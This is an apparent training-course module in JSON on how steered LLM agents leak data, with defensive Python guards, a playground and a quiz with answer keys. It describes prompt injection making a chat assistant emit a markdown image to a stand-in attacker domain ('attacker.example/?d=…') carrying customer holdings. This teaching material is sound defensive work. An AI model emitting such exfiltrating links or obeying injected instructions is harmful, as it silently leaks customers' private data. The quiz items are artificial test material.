@@ -1,0 +1,856 @@
+{
+  "id": "exfil",
+  "moduleSlug": "security",
+  "name": "Data Exfiltration Through Tools",
+  "shortName": "Exfiltration",
+  "question": "How could data leave, and who is on the other end?",
+  "summary": "Once an agent is steered, the attacker needs a way out for the data. Channels include markdown images and links the chat client fetches automatically, web-fetch tools with data in the URL, outbound email or messaging tools, and writes to shared documents. Close silent channels, allowlist destinations, scan what goes out, and keep the data the agent can reach to what the task needs.",
+  "useCases": [
+    "Agents with access to personal or financial data",
+    "Chat interfaces that render markdown, links or images",
+    "Any tool that sends, posts, fetches or writes externally"
+  ],
+  "keyFacts": {
+    "label": "Channels and controls",
+    "items": [
+      {
+        "term": "Markdown images",
+        "detail": "fetched automatically by the client: a leak with no click"
+      },
+      {
+        "term": "Web fetch",
+        "detail": "data smuggled in the URL or query string"
+      },
+      {
+        "term": "Email and messaging",
+        "detail": "sends content to any address the model chooses"
+      },
+      {
+        "term": "Egress allowlist",
+        "detail": "only approved domains can be reached or rendered"
+      },
+      {
+        "term": "DLP",
+        "detail": "scan outbound text for account numbers, Aadhaar, PAN, card numbers"
+      },
+      {
+        "term": "Blast radius",
+        "detail": "rows the agent can read per session: all customers or only this one"
+      }
+    ]
+  },
+  "steps": [
+    "List every way output can reach the outside, including rendering",
+    "Block untrusted images and links; allowlist domains for fetch tools",
+    "Add DLP and human approval to external sends",
+    "Scope data access to the current customer and task"
+  ],
+  "pitfalls": [
+    "Forgetting that the chat renderer is itself an outbound channel",
+    "Allowlisting a domain with an open redirect",
+    "A service account that can read every customer’s records"
+  ],
+  "tools": [
+    "Content Security Policy",
+    "Egress proxies (Squid, Envoy)",
+    "Microsoft Presidio",
+    "Google Cloud Sensitive Data Protection",
+    "Amazon Macie"
+  ],
+  "remember": "Close the silent channels. Allowlist the rest. Shrink what can leak.",
+  "caption": "Illustrative: an injected markdown image carries account data to an attacker’s domain when the chat renders it.",
+  "comparison": {
+    "scope": "Rendering and outbound tools",
+    "cost": 2,
+    "needs": "Egress control and scoped data",
+    "best": "Silent leaks through rendering"
+  },
+  "diagram": {
+    "file": "diagrams/exfil.svg"
+  },
+  "lesson": {
+    "file": "outbound_guard.py",
+    "language": "python",
+    "code": [
+      {
+        "text": "import re",
+        "steps": []
+      },
+      {
+        "text": "from urllib.parse import urlparse",
+        "steps": []
+      },
+      {
+        "text": "from presidio_analyzer import AnalyzerEngine",
+        "steps": []
+      },
+      {
+        "text": "",
+        "steps": []
+      },
+      {
+        "text": "CHANNELS = [\"render:image\", \"render:link\", \"tool:fetch_url\", \"tool:send_email\"]",
+        "steps": [
+          1
+        ]
+      },
+      {
+        "text": "ALLOWED = {\"bank.example.in\"}",
+        "steps": [
+          2,
+          3
+        ]
+      },
+      {
+        "text": "MD = re.compile(r\"!?\\[([^\\]]*)\\]\\((\\S+?)\\)\")",
+        "steps": []
+      },
+      {
+        "text": "analyzer = AnalyzerEngine()",
+        "steps": []
+      },
+      {
+        "text": "",
+        "steps": []
+      },
+      {
+        "text": "def before_render(reply: str) -> str:",
+        "steps": []
+      },
+      {
+        "text": "    return MD.sub(lambda m: m.group(0) if urlparse(m.group(2)).hostname in ALLOWED",
+        "steps": [
+          2
+        ]
+      },
+      {
+        "text": "                  else m.group(1), reply)          # keep the label, drop the URL",
+        "steps": [
+          2
+        ]
+      },
+      {
+        "text": "",
+        "steps": []
+      },
+      {
+        "text": "def fetch_url(url: str):",
+        "steps": []
+      },
+      {
+        "text": "    if urlparse(url).hostname not in ALLOWED:",
+        "steps": [
+          3
+        ]
+      },
+      {
+        "text": "        raise PermissionError(\"domain not on the allowlist\")",
+        "steps": [
+          3
+        ]
+      },
+      {
+        "text": "    return http_get(url, allow_redirects=False)",
+        "steps": [
+          3
+        ]
+      },
+      {
+        "text": "",
+        "steps": []
+      },
+      {
+        "text": "def send_email(to: str, body: str, approve):",
+        "steps": []
+      },
+      {
+        "text": "    hits = analyzer.analyze(text=body, language=\"en\",",
+        "steps": [
+          4
+        ]
+      },
+      {
+        "text": "                            entities=[\"IN_PAN\", \"IN_AADHAAR\", \"CREDIT_CARD\"])",
+        "steps": [
+          4
+        ]
+      },
+      {
+        "text": "    external = not to.endswith(\"@bank.example.in\")",
+        "steps": [
+          5
+        ]
+      },
+      {
+        "text": "    if (hits or external) and not approve(to, body):",
+        "steps": [
+          4,
+          5
+        ]
+      },
+      {
+        "text": "        return \"blocked\"",
+        "steps": []
+      },
+      {
+        "text": "    return mailer.send(to, body)",
+        "steps": []
+      },
+      {
+        "text": "",
+        "steps": []
+      },
+      {
+        "text": "def load_customer(session):",
+        "steps": []
+      },
+      {
+        "text": "    return db.accounts.find_one({\"customer_id\": session.customer_id})",
+        "steps": [
+          6
+        ]
+      }
+    ],
+    "steps": [
+      {
+        "title": "List every way out",
+        "text": "Rendering counts. A chat that renders images and links is an outbound channel, alongside tools that fetch URLs or send email."
+      },
+      {
+        "title": "Strip untrusted images and links",
+        "text": "Before the reply is rendered, any image or link to a domain outside the allowlist loses its URL. An injected image that carries data never loads."
+      },
+      {
+        "title": "Allowlist fetch destinations",
+        "text": "The fetch tool only reaches approved hosts and does not follow redirects, which could bounce data to another domain."
+      },
+      {
+        "title": "Scan outbound content",
+        "text": "Presidio looks for PAN, Aadhaar and card numbers in email bodies before they leave."
+      },
+      {
+        "title": "Approve external sends",
+        "text": "Any email to an outside address, or containing identifiers, waits for a human to approve it."
+      },
+      {
+        "title": "Shrink what can leak",
+        "text": "The agent loads only the current customer’s record. If every other control fails, one record is at risk, not the whole table."
+      }
+    ],
+    "sceneHeight": 258,
+    "scenes": [
+      {
+        "step": 1,
+        "svg": "<g class=\"a\" style=\"--d:0s\"><rect class=\"bx warn\" x=\"8\" y=\"6\" width=\"82\" height=\"22\" rx=\"6\"/><text class=\"mono\" x=\"49\" y=\"21\" text-anchor=\"middle\">image</text></g><g class=\"a\" style=\"--d:0.08s\"><rect class=\"bx warn\" x=\"96\" y=\"6\" width=\"82\" height=\"22\" rx=\"6\"/><text class=\"mono\" x=\"137\" y=\"21\" text-anchor=\"middle\">link</text></g><g class=\"a\" style=\"--d:0.16s\"><rect class=\"bx warn\" x=\"184\" y=\"6\" width=\"82\" height=\"22\" rx=\"6\"/><text class=\"mono\" x=\"225\" y=\"21\" text-anchor=\"middle\">fetch_url</text></g><g class=\"a\" style=\"--d:0.24s\"><rect class=\"bx warn\" x=\"272\" y=\"6\" width=\"82\" height=\"22\" rx=\"6\"/><text class=\"mono\" x=\"313\" y=\"21\" text-anchor=\"middle\">send_email</text></g>"
+      },
+      {
+        "step": 2,
+        "svg": "<g class=\"a\" style=\"--d:0s\"><rect class=\"bx pass\" x=\"8\" y=\"38\" width=\"344\" height=\"22\" rx=\"6\"/><text class=\"mono\" x=\"180\" y=\"53\" text-anchor=\"middle\">![c](attacker.example/?d=…) → “c”</text></g>"
+      },
+      {
+        "step": 3,
+        "svg": "<g class=\"a\" style=\"--d:0s\"><rect class=\"bx pass\" x=\"8\" y=\"68\" width=\"168\" height=\"22\" rx=\"6\"/><text class=\"mono\" x=\"92\" y=\"83\" text-anchor=\"middle\">fetch: allowlist only</text></g><g class=\"a\" style=\"--d:0.1s\"><rect class=\"bx pass\" x=\"184\" y=\"68\" width=\"168\" height=\"22\" rx=\"6\"/><text class=\"mono\" x=\"268\" y=\"83\" text-anchor=\"middle\">no redirects</text></g>"
+      },
+      {
+        "step": 4,
+        "svg": "<g class=\"a\" style=\"--d:0s\"><rect class=\"bx fail\" x=\"8\" y=\"98\" width=\"168\" height=\"22\" rx=\"6\"/><text class=\"tl\" x=\"92\" y=\"113\" text-anchor=\"middle\">body contains PAN</text></g><g class=\"a\" style=\"--d:0.1s\"><path class=\"ln \" d=\"M178 109L190 109\" marker-end=\"url(#arr)\"/></g><g class=\"a\" style=\"--d:0.15s\"><rect class=\"bx warn\" x=\"192\" y=\"98\" width=\"160\" height=\"22\" rx=\"6\"/><text class=\"tl\" x=\"272\" y=\"113\" text-anchor=\"middle\">hold for review</text></g>"
+      },
+      {
+        "step": 5,
+        "svg": "<g class=\"a\" style=\"--d:0s\"><rect class=\"bx acc\" x=\"8\" y=\"128\" width=\"344\" height=\"22\" rx=\"6\"/><text class=\"tl\" x=\"180\" y=\"143\" text-anchor=\"middle\">external address → approval required</text></g>"
+      },
+      {
+        "step": 6,
+        "svg": "<text class=\"tl a\" x=\"8\" y=\"172\" style=\"text-anchor:start;--d:0s\">Records the agent can read in one session</text><text class=\"tl a\" x=\"112\" y=\"191\" style=\"text-anchor:end;--d:0.1s\">whole table</text><rect x=\"118\" y=\"181\" width=\"190\" height=\"13\" rx=\"3\" class=\"skel\" style=\"opacity:.45\"/><rect class=\"a\" x=\"118\" y=\"181\" width=\"190\" height=\"13\" rx=\"3\" style=\"fill:var(--fail);--d:0.2s\"/><text class=\"mono a\" x=\"314\" y=\"191\" style=\"text-anchor:start;--d:0.30000000000000004s\">500</text><text class=\"tl a\" x=\"112\" y=\"213\" style=\"text-anchor:end;--d:0.2s\">this customer</text><rect x=\"118\" y=\"203\" width=\"190\" height=\"13\" rx=\"3\" class=\"skel\" style=\"opacity:.45\"/><rect class=\"a\" x=\"118\" y=\"203\" width=\"1.9000000000000001\" height=\"13\" rx=\"3\" style=\"fill:var(--pass);--d:0.30000000000000004s\"/><text class=\"mono a\" x=\"314\" y=\"213\" style=\"text-anchor:start;--d:0.4s\">1</text><g class=\"a\" style=\"--d:0.35s\"><text class=\"tag-t\" x=\"180\" y=\"244\" style=\"text-anchor:middle;fill:var(--pass)\">least privilege bounds the worst case</text></g>"
+      }
+    ]
+  },
+  "decision": {
+    "pros": [
+      "Closing channels works even when injection succeeds",
+      "Egress allowlists are simple to reason about",
+      "DLP catches accidental leaks too",
+      "Least privilege caps the worst case"
+    ],
+    "cons": [
+      "Legitimate features such as links and images get restricted",
+      "Allowlists need maintenance",
+      "DLP has false positives and misses encoded data",
+      "Approvals add friction"
+    ],
+    "avoidWhen": [
+      "Allowlisting broad domains, such as a whole cloud storage service",
+      "Relying on DLP alone; encoded or paraphrased data slips through"
+    ],
+    "tools": [
+      {
+        "name": "Content Security Policy",
+        "type": "Web standard",
+        "what": "Stop the browser loading images from other domains",
+        "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"
+      },
+      {
+        "name": "Microsoft Presidio",
+        "type": "Open source",
+        "what": "Detect and redact PII, including Indian PAN and Aadhaar",
+        "url": "https://microsoft.github.io/presidio/"
+      },
+      {
+        "name": "Squid or Envoy egress proxy",
+        "type": "Open source",
+        "what": "Allowlist outbound destinations",
+        "url": "https://www.envoyproxy.io"
+      },
+      {
+        "name": "Google Cloud Sensitive Data Protection",
+        "type": "Commercial",
+        "what": "Classify and mask sensitive data",
+        "url": "https://cloud.google.com/sensitive-data-protection/docs"
+      },
+      {
+        "name": "Amazon Macie",
+        "type": "Commercial (AWS)",
+        "what": "Discover sensitive data in storage",
+        "url": "https://aws.amazon.com/macie/"
+      }
+    ]
+  },
+  "playgroundGuide": {
+    "scenario": "A wealth-management assistant is steered by injected text in 5% of the 10,000 sessions a month that contain an attempt. Decide what data it can read and which output channels it has, then add controls, and watch how many customer records would leave each month.",
+    "controls": [
+      "Choose whether the agent can read any customer’s data or only the current customer’s.",
+      "Switch output channels on and off: rendered images, a web-fetch tool and an email tool.",
+      "Add an egress allowlist, DLP on outbound email and human approval, or load a scenario."
+    ],
+    "outputs": [
+      {
+        "name": "Images, web fetch, email",
+        "meaning": "The chance each channel leaks in a steered session, given the controls."
+      },
+      {
+        "name": "Chance a steered session leaks",
+        "meaning": "Combined chance over all open channels."
+      },
+      {
+        "name": "Records leaked a month",
+        "meaning": "Steered sessions × chance of a leak × records per leak."
+      }
+    ],
+    "presets": [
+      {
+        "k": "start",
+        "name": "Everything open",
+        "expect": "Every steered session leaks through rendered images: 250,000 records a month."
+      },
+      {
+        "k": "silent",
+        "name": "Only image rendering on",
+        "expect": "No tools at all, yet every steered session still leaks: 250,000 records a month."
+      },
+      {
+        "k": "scoped",
+        "name": "Scoped, allowlist, approval",
+        "expect": "7.5% of steered sessions leak one record each: about 37 records a month."
+      },
+      {
+        "k": "tight",
+        "name": "Plus DLP",
+        "expect": "1.9% of steered sessions leak: about 9 records a month."
+      }
+    ],
+    "missions": [
+      {
+        "k": "mail",
+        "text": "Keep the email tool and leak fewer than 100 records a month.",
+        "hint": "Scope the data first: it multiplies everything else."
+      },
+      {
+        "k": "both",
+        "text": "Keep both the email and web-fetch tools and leak fewer than 10 records a month.",
+        "hint": "Allowlist egress, add DLP and approval, and scope the data."
+      },
+      {
+        "k": "silent",
+        "text": "Show that rendered images alone leak in every steered session, with no tools at all.",
+        "hint": "Turn off both tools and the allowlist, and leave image rendering on."
+      }
+    ],
+    "tools": [
+      {
+        "n": "Content Security Policy",
+        "type": "Web standard",
+        "start": 3,
+        "prod": 3,
+        "best": "Tells the browser which domains images and scripts may load from.",
+        "ex": "img-src 'self' cdn.bank.example.in blocks injected image URLs.",
+        "pros": [
+          "Enforced by the browser",
+          "No model involved"
+        ],
+        "cons": [
+          "Only for web clients",
+          "Must be kept up to date"
+        ],
+        "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"
+      },
+      {
+        "n": "Microsoft Presidio",
+        "type": "Open source",
+        "start": 3,
+        "prod": 2,
+        "best": "Detects and redacts PII, including Indian PAN and Aadhaar recognizers.",
+        "ex": "Scan every outbound email body and hold any with identifiers.",
+        "pros": [
+          "Self-hosted",
+          "Extensible recognizers"
+        ],
+        "cons": [
+          "Pattern-based misses",
+          "Tuning needed for scores"
+        ],
+        "url": "https://microsoft.github.io/presidio/"
+      },
+      {
+        "n": "Envoy egress proxy",
+        "type": "Open source",
+        "start": 2,
+        "prod": 3,
+        "best": "Routes all outbound traffic through an allowlist.",
+        "ex": "Allow only the bank’s own domains from the agent’s pods.",
+        "pros": [
+          "One place to enforce egress",
+          "Works for every tool"
+        ],
+        "cons": [
+          "Infrastructure to run",
+          "Allowlists need owners"
+        ],
+        "url": "https://www.envoyproxy.io"
+      },
+      {
+        "n": "Google Cloud Sensitive Data Protection",
+        "type": "Commercial",
+        "start": 3,
+        "prod": 3,
+        "best": "Managed classification and masking of sensitive data.",
+        "ex": "Mask account numbers in agent outputs before they are logged or sent.",
+        "pros": [
+          "Managed at scale",
+          "Many detectors"
+        ],
+        "cons": [
+          "Cloud dependency",
+          "Costs per volume"
+        ],
+        "url": "https://cloud.google.com/sensitive-data-protection/docs"
+      }
+    ],
+    "quickPicks": [
+      {
+        "need": "My chat renders markdown",
+        "tool": "Strip untrusted images and links, and set a Content Security Policy"
+      },
+      {
+        "need": "My agent can send email",
+        "tool": "DLP plus approval for external addresses"
+      },
+      {
+        "need": "My agent can read many customers",
+        "tool": "Scope it to the current customer before anything else"
+      }
+    ],
+    "goals": [
+      "Find the silent channel",
+      "See how scope multiplies every leak",
+      "Combine allowlists, DLP and approval"
+    ]
+  },
+  "practice": {
+    "scenario": "A wealth-management chat assistant renders markdown. A red-team test showed that an injected instruction could make it output an image whose URL contained the customer’s holdings, which the browser then fetched from the attacker’s domain. The fix: strip images and links to domains outside an allowlist before rendering, scan outbound text for Indian identifiers, and limit the agent to the current customer’s data.",
+    "industries": [
+      {
+        "industry": "Wealth management",
+        "use": "Stop holdings and account numbers leaving through rendered images"
+      },
+      {
+        "industry": "Insurance",
+        "use": "Scan outbound claim emails for Aadhaar and PAN before they are sent"
+      },
+      {
+        "industry": "HR tech",
+        "use": "Keep a payroll agent from posting salary data to external webhooks"
+      }
+    ],
+    "analogy": "A bank branch where every envelope leaving the building passes a desk that checks the address against a list and looks inside for account numbers.",
+    "library": {
+      "name": "Microsoft Presidio",
+      "what": "Open-source PII detection and anonymisation, with recognizers including Indian PAN and Aadhaar.",
+      "install": "pip install presidio-analyzer presidio-anonymizer"
+    },
+    "note": "Check that the Indian recognizers are enabled in your Presidio version, and pair this with a Content Security Policy that blocks image loads from other domains.",
+    "samples": [
+      {
+        "file": "outbound_guard.py",
+        "language": "python",
+        "code": "import re\nfrom urllib.parse import urlparse\nfrom presidio_analyzer import AnalyzerEngine\n\nALLOWED = {\"bank.example.in\", \"cdn.bank.example.in\"}\nanalyzer = AnalyzerEngine()\nMD_LINK = re.compile(r\"!?\\[([^\\]]*)\\]\\((\\S+?)\\)\")      # markdown images and links\n\ndef strip_untrusted_links(text: str) -> str:\n    def keep(m):\n        host = urlparse(m.group(2)).hostname or \"\"\n        return m.group(0) if host in ALLOWED else m.group(1)   # keep the label only\n    return MD_LINK.sub(keep, text)\n\ndef contains_identifiers(text: str) -> bool:\n    hits = analyzer.analyze(text=text, language=\"en\",\n                            entities=[\"IN_PAN\", \"IN_AADHAAR\", \"CREDIT_CARD\", \"IBAN_CODE\"])\n    return any(h.score >= 0.6 for h in hits)\n\ndef before_render(reply: str) -> str:\n    return strip_untrusted_links(reply)\n\ndef before_send_email(body: str, approve) -> bool:\n    return not contains_identifiers(body) or approve(body)"
+      }
+    ]
+  },
+  "numericDrill": {
+    "question": "Each month 10,000 sessions contain an injection attempt and 5% of them steer the agent. The only open channel is an email tool; with approval and DLP it leaks in 1.4% of steered sessions. The agent can read only the current customer’s record. How many records leak per month?",
+    "answer": "10,000 × 0.05 = 500 steered sessions; 500 × 0.014 = 7 leaks of one record each, so 7 records. If the agent could read 500 customers per session, the same 7 leaks would expose up to 3,500 records.",
+    "expected": {
+      "value": 7,
+      "tolerance": 0.1,
+      "label": "records ="
+    },
+    "interview": [
+      {
+        "question": "Why are markdown images a dangerous channel?",
+        "answer": "The chat client fetches images automatically when it renders the reply. If an injected instruction makes the agent output an image whose URL contains private data, the user’s browser sends that data to the attacker’s server with no click. Block images from untrusted domains, or strip them before rendering."
+      },
+      {
+        "question": "How does least privilege reduce exfiltration risk?",
+        "answer": "It shrinks the blast radius: if the agent can only read the current customer’s data for the current task, a successful attack leaks one record rather than thousands. Combined with closed or gated channels, it bounds the worst case even when an injection succeeds."
+      }
+    ],
+    "mistakes": [
+      {
+        "mistake": "Allowlisting a domain that has an open redirect",
+        "fix": "Allowlist exact hosts and check for redirects"
+      },
+      {
+        "mistake": "Giving the agent a service account that can read every customer",
+        "fix": "Scope access to the current customer and task"
+      }
+    ]
+  },
+  "quiz": [
+    {
+      "id": "ex01",
+      "kind": "single",
+      "industry": "Wealth management",
+      "question": "An injected instruction makes the assistant output an image whose URL carries the customer’s holdings. When does the data leave?",
+      "options": [
+        "Only if the user clicks the image",
+        "When the chat client fetches the image to render it",
+        "Never, because images are static",
+        "Only on mobile"
+      ],
+      "correct": [
+        1
+      ],
+      "explanation": "Rendering fetches the URL automatically."
+    },
+    {
+      "id": "ex02",
+      "kind": "single",
+      "industry": "Banking",
+      "question": "Which control stops a browser from loading images from unapproved domains?",
+      "options": [
+        "Content Security Policy",
+        "A longer system prompt",
+        "Rate limiting",
+        "Prompt caching"
+      ],
+      "correct": [
+        0
+      ],
+      "explanation": "A CSP img-src rule restricts where images load from."
+    },
+    {
+      "id": "ex03",
+      "kind": "single",
+      "industry": "Wealth management",
+      "question": "10,000 sessions a month contain an injection attempt, 5% steer the agent, and each steered session leaks with probability 1.4%, one record each. How many records leak per month?",
+      "options": [
+        "0.7",
+        "7",
+        "70",
+        "700"
+      ],
+      "correct": [
+        1
+      ],
+      "explanation": "10,000 × 0.05 × 0.014 = 7."
+    },
+    {
+      "id": "ex04",
+      "kind": "single",
+      "industry": "Banking",
+      "question": "An allowlist check uses `if \"bank.example.in\" in url`. Why is this unsafe?",
+      "options": [
+        "It is slow",
+        "A URL on another host can contain that text, for example in its query string",
+        "It blocks the bank’s own domain",
+        "It needs a regex"
+      ],
+      "correct": [
+        1
+      ],
+      "explanation": "Compare the parsed host, not a substring of the whole URL."
+    },
+    {
+      "id": "ex05",
+      "kind": "multi",
+      "industry": "Insurance",
+      "question": "Which help prevent data leaving through an email tool? Select all that apply.",
+      "options": [
+        "DLP scanning of outbound bodies",
+        "Human approval for external recipients",
+        "Letting the model choose any recipient",
+        "Longer email subjects"
+      ],
+      "correct": [
+        0,
+        1
+      ],
+      "explanation": "Scanning and approval gate what leaves and where it goes."
+    },
+    {
+      "id": "ex06",
+      "kind": "single",
+      "industry": "Banking",
+      "question": "Why should a fetch tool not follow redirects automatically?",
+      "options": [
+        "Redirects are slow",
+        "An allowlisted host with a redirect can bounce the request, and its data, to another domain",
+        "Redirects break HTTPS",
+        "Redirects use more tokens"
+      ],
+      "correct": [
+        1
+      ],
+      "explanation": "Open redirects turn an allowed host into a relay."
+    },
+    {
+      "id": "ex07",
+      "kind": "single",
+      "industry": "HR tech",
+      "question": "A payroll agent can read every employee’s salary for any question. What principle is being violated?",
+      "options": [
+        "Least privilege",
+        "Idempotency",
+        "Determinism",
+        "Caching"
+      ],
+      "correct": [
+        0
+      ],
+      "explanation": "Scope access to what the task needs."
+    },
+    {
+      "id": "ex08",
+      "kind": "multi",
+      "industry": "Healthcare",
+      "question": "Which Indian identifiers should outbound DLP look for in a health-insurance agent? Select all that apply.",
+      "options": [
+        "PAN",
+        "Aadhaar number",
+        "The hospital’s public address",
+        "The policy product name"
+      ],
+      "correct": [
+        0,
+        1
+      ],
+      "explanation": "PAN and Aadhaar are personal identifiers; public details are not."
+    },
+    {
+      "id": "ex09",
+      "kind": "single",
+      "industry": "Wealth management",
+      "question": "With all tools off, only image rendering on and no allowlist, what share of steered sessions leak?",
+      "options": [
+        "0%",
+        "About half",
+        "All of them",
+        "Only those with a click"
+      ],
+      "correct": [
+        2
+      ],
+      "explanation": "Rendering alone is a silent, automatic channel."
+    },
+    {
+      "id": "ex10",
+      "kind": "single",
+      "industry": "Banking",
+      "question": "An agent can read 500 customers’ records per session. After scoping to the current customer, the same number of leaks happen. How does exposure change?",
+      "options": [
+        "It stays the same",
+        "It falls from up to 500 records per leak to 1",
+        "It doubles",
+        "It depends on the model"
+      ],
+      "correct": [
+        1
+      ],
+      "explanation": "Scoping shrinks the blast radius of every leak."
+    },
+    {
+      "id": "ex11",
+      "kind": "multi",
+      "industry": "E-commerce",
+      "question": "Which are exfiltration channels for a shopping assistant? Select all that apply.",
+      "options": [
+        "A web-fetch tool that accepts any URL",
+        "Markdown links shown to the user",
+        "The product catalogue it reads",
+        "The user’s cart it displays to the same user"
+      ],
+      "correct": [
+        0,
+        1
+      ],
+      "explanation": "Fetching and links can carry data outward; reading internal data or showing it to its owner is not exfiltration."
+    },
+    {
+      "id": "ex12",
+      "kind": "single",
+      "industry": "Banking",
+      "question": "What is the main weakness of DLP as the only exfiltration control?",
+      "options": [
+        "It is too expensive",
+        "Encoded or paraphrased data can slip past pattern matching",
+        "It blocks all email",
+        "It needs GPUs"
+      ],
+      "correct": [
+        1
+      ],
+      "explanation": "DLP is a useful layer, not a guarantee."
+    },
+    {
+      "id": "ex13",
+      "kind": "single",
+      "industry": "SaaS",
+      "question": "Which is the safest way to render model output that may contain links?",
+      "options": [
+        "Render all links as clickable",
+        "Keep links only to allowlisted hosts and show others as plain text",
+        "Hide all output",
+        "Render links as images"
+      ],
+      "correct": [
+        1
+      ],
+      "explanation": "Untrusted links lose their URL; trusted ones stay useful."
+    },
+    {
+      "id": "ex14",
+      "kind": "multi",
+      "industry": "Fintech",
+      "question": "Which reduce the number of leaked records if an injection succeeds? Select all that apply.",
+      "options": [
+        "Scoping the agent to the current customer",
+        "Closing unneeded outbound channels",
+        "A friendlier system prompt",
+        "Storing logs longer"
+      ],
+      "correct": [
+        0,
+        1
+      ],
+      "explanation": "Less reachable data and fewer ways out both cut leaks."
+    },
+    {
+      "id": "ex15",
+      "kind": "single",
+      "industry": "Banking",
+      "question": "An allowlist includes a whole cloud-storage domain used by many customers. What is the risk?",
+      "options": [
+        "None",
+        "Attackers can host their own bucket on the same domain and receive data",
+        "Storage costs rise",
+        "Latency rises"
+      ],
+      "correct": [
+        1
+      ],
+      "explanation": "Allowlist exact hosts you control, not shared platforms."
+    },
+    {
+      "id": "ex16",
+      "kind": "single",
+      "industry": "Insurance",
+      "question": "A claims agent sends emails only to addresses on the policy record, after DLP. Which leg of the trifecta has been gated?",
+      "options": [
+        "Private data",
+        "Untrusted content",
+        "External communication",
+        "None"
+      ],
+      "correct": [
+        2
+      ],
+      "explanation": "The outbound channel now only reaches verified recipients."
+    },
+    {
+      "id": "ex17",
+      "kind": "multi",
+      "industry": "Banking",
+      "question": "How would you test exfiltration defences before launch? Select all that apply.",
+      "options": [
+        "Plant unique fake markers in staging data and try to exfiltrate them",
+        "Watch egress logs and outputs for the markers",
+        "Test only in production",
+        "Ask the model whether it would leak data"
+      ],
+      "correct": [
+        0,
+        1
+      ],
+      "explanation": "Canary data plus monitoring proves or disproves leak paths."
+    },
+    {
+      "id": "ex18",
+      "kind": "single",
+      "industry": "Wealth management",
+      "question": "Scoped data, allowlist, approval and DLP, with images, fetch and email all on. About how many records leak per month from 500 steered sessions at a 1.9% leak rate, one record each?",
+      "options": [
+        "About 1",
+        "About 9 to 10",
+        "About 95",
+        "About 500"
+      ],
+      "correct": [
+        1
+      ],
+      "explanation": "500 × 0.019 ≈ 9.5."
+    },
+    {
+      "id": "ex19",
+      "kind": "single",
+      "industry": "Government services",
+      "question": "Which is an example of exfiltration through a write action?",
+      "options": [
+        "Reading a public page",
+        "Writing customer data into a publicly shared document",
+        "Calculating a total",
+        "Formatting a date"
+      ],
+      "correct": [
+        1
+      ],
+      "explanation": "Writes to places others can read are outbound channels too."
+    },
+    {
+      "id": "ex20",
+      "kind": "multi",
+      "industry": "Banking",
+      "question": "Which statements about exfiltration are correct? Select all that apply.",
+      "options": [
+        "It needs both a steered agent and an open channel",
+        "Closing channels helps even when injection defences fail",
+        "It is prevented by encrypting the database",
+        "It only happens through email"
+      ],
+      "correct": [
+        0,
+        1
+      ],
+      "explanation": "Controls on the way out are a second, independent layer."
+    }
+  ]
+}
